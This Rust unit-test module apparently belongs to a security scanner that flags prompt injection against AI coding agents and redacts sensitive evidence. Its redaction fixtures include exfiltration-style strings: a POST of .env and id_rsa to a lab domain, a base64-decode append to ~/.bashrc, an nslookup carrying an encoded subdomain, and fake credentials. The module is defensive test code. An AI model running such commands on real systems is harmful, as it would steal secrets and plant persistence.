            signal_types: vec!["atomic".to_string()],
            analytic_intents: vec!["alert".to_string()],
            atlas_tags: vec!["atlas:AML.T0051".to_string()],
            tags: vec!["tag".to_string()],
            evidence: Vec::new(),
            risk_score: 90,
            event_time: Some("2026-05-01T00:00:00Z".to_string()),
        });

        let response = event.response.expect("response metadata");
        assert_eq!(response.recommended_action, "investigate_immediately");
        assert_eq!(
            response.response_playbook,
            "adr-playbook-mcp-prompt-injection"
        );
        assert_eq!(response.escalation, "security_review_required");
        assert!(response.investigation_summary.contains("critical"));
        assert!(
            response
                .investigation_summary
                .contains("mcp.tool_metadata.prompt_injection")
        );
        assert_eq!(event.detection_classes, vec!["security_detection"]);
        assert_eq!(event.signal_types, vec!["atomic"]);
        assert_eq!(event.analytic_intents, vec!["alert"]);
        assert_eq!(event.atlas_tags, vec!["atlas:AML.T0051"]);
    }

    #[test]
    fn redact_sensitive_text_masks_controlled_domain_and_secret_markers() {
        let redacted = redact_sensitive_text(
            "POST https://darkroastcyber.io/mcp-lab with .env and id_rsa and sk-1234567890abcdef1234; pip install fixture && echo SGVsbG8= | base64 --decode >> ~/.bashrc",
        );

        assert!(!redacted.contains("darkroastcyber.io"));
        assert!(!redacted.contains(".env"));
        assert!(!redacted.contains("id_rsa"));
        assert!(!redacted.contains("sk-1234567890abcdef1234"));
        assert!(!redacted.contains("pip install"));
        assert!(!redacted.contains("base64 --decode"));
        assert!(!redacted.contains("~/.bashrc"));
        assert!(redacted.contains("[controlled-domain]"));
        assert!(redacted.contains("[sensitive-path]"));
        assert!(redacted.contains("[redacted-secret]"));
        assert!(redacted.contains("[package-manager-command]"));
        assert!(redacted.contains("[encoded-decoder]"));
        assert!(redacted.contains("[startup-target]"));
    }

    #[test]
    fn redact_sensitive_text_masks_encoded_blobs() {
        let redacted = redact_sensitive_text(
            "nslookup U1lOVEhFVElDX1BBWUxPQUQ=.example.invalid after encoding data",
        );

        assert!(!redacted.contains("U1lOVEhFVElDX1BBWUxPQUQ"));
        assert!(redacted.contains("[encoded-blob]"));
    }

    #[test]
    fn redact_sensitive_text_truncates_long_dense_evidence() {
        let redacted = redact_sensitive_text(&"normal-text-".repeat(80));

        assert_eq!(redacted.chars().count(), 512);
        assert!(redacted.ends_with("[truncated]"));
    }

    #[test]
    fn redact_sensitive_text_masks_rule_seeded_credential_patterns() {
        let redacted = redact_sensitive_text(
            "Seen AKIA1234567890ABCDEF, xoxb-1234567890abcdefABCDE, eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ.eyJzdWIiOiJhZHItZml4dHVyZSIsImlhdCI6MTUxNjIzOTAyMn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c, and Bearer fixture_oauth_token_1234567890abcdef while checking fixture output.",
        );

        assert!(!redacted.contains("AKIA1234567890ABCDEF"));
        assert!(!redacted.contains("xoxb-1234567890abcdefABCDE"));
        assert!(!redacted.contains("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ"));
        assert!(!redacted.contains("fixture_oauth_token_1234567890abcdef"));
        assert!(redacted.contains("[redacted-secret]"));
    }

    #[test]
    fn event_builder_sanitizes_null_string_tool_name() {
        let event = detection_event(DetectionEventInput {
            client: ClientId::Codex,
            agent: None,
            model: None,
            provider: None,
            session_id: "session".to_string(),
            source_path_hash: "hash".to_string(),
            tool_name: Some("null".to_string()),
            rule_ids: vec!["rule".to_string()],
            categories: vec!["category".to_string()],
            detection_classes: Vec::new(),
            signal_types: Vec::new(),
            analytic_intents: Vec::new(),
            atlas_tags: Vec::new(),
            tags: vec!["tag".to_string()],
            evidence: Vec::new(),
            risk_score: 10,
            event_time: Some("2026-05-01T00:00:00Z".to_string()),
        });

        assert_eq!(event.tool_name, None);
    }

    #[test]
    fn detection_event_falls_back_to_observed_time_for_future_source_timestamp() {
        let event = detection_event(DetectionEventInput {
            client: ClientId::Codex,
            agent: None,
            model: None,
            provider: None,
            session_id: "session".to_string(),
            source_path_hash: "hash".to_string(),
            tool_name: None,
            rule_ids: vec!["rule".to_string()],
            categories: vec!["category".to_string()],
            detection_classes: Vec::new(),
            signal_types: Vec::new(),
            analytic_intents: Vec::new(),
            atlas_tags: Vec::new(),
            tags: vec!["tag".to_string()],
            evidence: Vec::new(),
            risk_score: 10,
            event_time: Some("2999-01-01T00:00:00Z".to_string()),
        });

        assert_eq!(event.time_source, "override");
        assert_eq!(event.time_confidence, "low");
        assert_eq!(
            event.time_override_reason.as_deref(),
            Some("source_timestamp_future_skew")
        );
        assert_eq!(
            event.event_time.as_deref(),
            Some("2999-01-01T00:00:00.000Z")
        );
        assert_eq!(event.timestamp, event.observed_at);
        assert_eq!(event.ingested_at, event.observed_at);
    }

    #[test]
    fn detection_event_falls_back_to_observed_time_for_missing_source_timestamp() {
        let event = detection_event(DetectionEventInput {
            client: ClientId::Codex,
            agent: None,
            model: None,
            provider: None,
            session_id: "session".to_string(),
            source_path_hash: "hash".to_string(),
            tool_name: None,
            rule_ids: vec!["rule".to_string()],
            categories: vec!["category".to_string()],
            detection_classes: Vec::new(),
            signal_types: Vec::new(),
            analytic_intents: Vec::new(),
            atlas_tags: Vec::new(),
            tags: vec!["tag".to_string()],
            evidence: Vec::new(),
            risk_score: 10,
            event_time: None,
        });

        assert_eq!(event.time_source, "observed");
        assert_eq!(event.time_confidence, "low");
        assert_eq!(
            event.time_override_reason.as_deref(),
            Some("missing_source_timestamp")
        );
        assert_eq!(event.event_time, None);
        assert_eq!(event.timestamp, event.observed_at);
        assert_eq!(event.ingested_at, event.observed_at);
    }

    #[test]
    fn format_timestamp_normalizes_non_utc_offsets() {
        let timestamp =
            parse_event_timestamp("2026-05-01T12:00:00+02:00").expect("parse timestamp");

        assert_eq!(format_timestamp(timestamp), "2026-05-01T10:00:00.000Z");
    }

    #[test]
    fn detection_event_normalizes_non_utc_source_timestamp() {
        let event = detection_event(DetectionEventInput {
            client: ClientId::Codex,
            agent: None,
            model: None,
            provider: None,
            session_id: "session".to_string(),
            source_path_hash: "hash".to_string(),
            tool_name: None,
            rule_ids: vec!["rule".to_string()],
            categories: vec!["category".to_string()],
            detection_classes: Vec::new(),
            signal_types: Vec::new(),
            analytic_intents: Vec::new(),
            atlas_tags: Vec::new(),
            tags: vec!["tag".to_string()],
            evidence: Vec::new(),
            risk_score: 10,
            event_time: Some("2026-05-01T12:00:00+02:00".to_string()),
        });

        assert_eq!(event.time_source, "source");
        assert_eq!(event.time_confidence, "high");
        assert_eq!(event.time_override_reason, None);
        assert_eq!(
            event.event_time.as_deref(),
            Some("2026-05-01T10:00:00.000Z")
        );
        assert_eq!(event.timestamp, "2026-05-01T10:00:00.000Z");
    }

    #[test]
    fn redact_sensitive_text_masks_private_key_headers_case_insensitively() {
        let redacted = redact_sensitive_text(
            "Command output: -----BEGIN OpenSSH PRIVATE KEY----- synthetic-fixture-body -----END OpenSSH PRIVATE KEY-----",
        );

        assert!(!redacted.contains("BEGIN"));
        assert!(!redacted.contains("END"));
        assert!(!redacted.contains("PRIVATE KEY"));
        assert!(!redacted.contains("OpenSSH"));
        assert!(redacted.contains("[redacted-secret]"));
    }

    #[test]
    fn scanner_error_event_has_correct_shape() {
        use crate::clients::SourceKind;
        use crate::discovery::Source;
        use crate::parser::ParseError;
        use std::path::PathBuf;

        let source = Source {
            client: ClientId::OpenCode,
            kind: SourceKind::Sqlite,
            source_id: "opencode.sqlite".to_string(),
            path: PathBuf::from("/home/user/.local/share/opencode/opencode.db"),
        };
        let error = ParseError::Sqlite(rusqlite::Error::InvalidQuery);

        let event = scanner_error_event(&source, &error);

        assert_eq!(event.event_type, "scanner_error");
        assert_eq!(event.severity, "informational");
        assert_eq!(event.risk_score, 0);
        assert_eq!(event.client, "opencode");
        assert_eq!(event.session_id, "scanner");
        assert_eq!(event.agent, None);
        assert_eq!(event.model, None);
        assert_eq!(event.tool_name, None);
        assert_eq!(event.rule_ids.len(), 0);
        assert!(event.source_path_hash.is_some());
        assert_eq!(event.tags, vec!["scanner", "parse_failure"]);
        assert_eq!(event.evidence.len(), 2);
        assert_eq!(event.evidence[0].field, "error");
        assert_eq!(event.evidence[1].field, "source_path");
        assert!(event.evidence[1].hash.is_some());
        assert_eq!(event.triage, None);
        assert_eq!(event.response, None);
        assert_eq!(event.source_counts, None);
        assert_eq!(event.component.as_deref(), Some("scanner"));
        assert_eq!(event.check_name.as_deref(), Some("source_parse"));
        assert_eq!(event.status.as_deref(), Some("degraded"));
    }

    #[test]
    fn redact_error_message_strips_absolute_paths() {
        let redacted = redact_error_message(
            "io error: No such file or directory (os error 2) at /home/user/.local/share/opencode/opencode.db",
        );
        assert!(!redacted.contains("/home/user"));
        assert!(redacted.contains("<path>"));
    }

    #[test]
    fn redact_error_message_truncates_long_messages() {
        let long_msg = "x".repeat(300);
        let redacted = redact_error_message(&long_msg);
        assert!(redacted.len() <= 200);
        assert!(redacted.ends_with("..."));
    }

    #[test]
    fn redact_error_message_masks_secrets() {
        let redacted = redact_error_message("connection failed: token: abc123secret");
        assert!(!redacted.contains("abc123secret"));
        assert!(redacted.contains("[redacted-secret]"));
    }

    #[test]
    fn redact_error_message_strips_windows_paths() {
        let redacted = redact_error_message(
            r#"sqlite open failed at C:\Users\tester\AppData\Local\opencode\opencode.db"#,
        );
        assert!(!redacted.contains(r#"C:\Users\tester"#));
        assert!(redacted.contains("<path>"));
    }

    #[test]
    fn operational_alert_event_has_correct_shape() {
        let event = operational_alert_event(OperationalAlertInput {
            alert_type: "scanner_error_threshold_exceeded".to_string(),
            threshold: "max_scanner_errors=3".to_string(),
            actual_value: "scanner_error_count=5".to_string(),
            scan_duration_ms: Some(1500),
            scanner_error_count: Some(5),
        });

        assert_eq!(event.event_type, "operational_alert");
        assert_eq!(event.severity, "warning");
        assert_eq!(event.risk_score, 0);
        assert_eq!(event.client, "scanner");
        assert_eq!(event.session_id, "scanner");
        assert_eq!(event.component.as_deref(), Some("scanner"));
        assert_eq!(event.check_name.as_deref(), Some("scanner_error_threshold"));
        assert_eq!(event.status.as_deref(), Some("degraded"));
        assert_eq!(event.categories, vec!["operational"]);
        assert!(event.tags.contains(&"operational".to_string()));
        assert!(event.tags.contains(&"scanner_health".to_string()));
        assert_eq!(event.scan_duration_ms, Some(1500));
        assert!(event.adr_version.is_some());
        assert_eq!(event.triage, None);
        assert_eq!(event.response, None);
        assert!(event.source_path_hash.is_none());

        let alert_type = event
            .evidence
            .iter()
            .find(|e| e.field == "alert_type")
            .expect("alert_type evidence");
        assert_eq!(
            alert_type.redacted_value,
            "scanner_error_threshold_exceeded"
        );

        let threshold = event
            .evidence
            .iter()
            .find(|e| e.field == "threshold")
            .expect("threshold evidence");
        assert_eq!(threshold.redacted_value, "max_scanner_errors=3");

        let actual = event
            .evidence
            .iter()
            .find(|e| e.field == "actual_value")
            .expect("actual_value evidence");
        assert_eq!(actual.redacted_value, "scanner_error_count=5");

        let error_count = event
            .evidence
            .iter()
            .find(|e| e.field == "scanner_error_count")
            .expect("scanner_error_count evidence");
        assert_eq!(error_count.redacted_value, "5");

        let duration = event
            .evidence
            .iter()
            .find(|e| e.field == "scan_duration_ms")
            .expect("scan_duration_ms evidence");
        assert_eq!(duration.redacted_value, "1500");
    }

    #[test]
    fn operational_alert_event_includes_duration_evidence() {
        let event = operational_alert_event(OperationalAlertInput {
            alert_type: "scan_duration_threshold_exceeded".to_string(),
            threshold: "max_scan_duration_ms=300000".to_string(),
            actual_value: "scan_duration_ms=600000".to_string(),
            scan_duration_ms: Some(600_000),
            scanner_error_count: None,
        });

        assert_eq!(event.event_type, "operational_alert");
        assert_eq!(event.severity, "warning");
        assert_eq!(event.check_name.as_deref(), Some("scan_duration_threshold"));
        assert_eq!(event.status.as_deref(), Some("degraded"));
        assert!(event.evidence.iter().any(|e| e.field == "scan_duration_ms"));
        assert!(
            event
                .evidence
                .iter()
                .all(|e| e.field != "scanner_error_count")
        );
    }

    #[test]
    fn load_operational_alert_config_returns_defaults() {
        let config = super::load_operational_alert_config();
        assert_eq!(config.max_scanner_errors, 3);
        assert_eq!(config.max_scan_duration_ms, 300_000);
    }
}
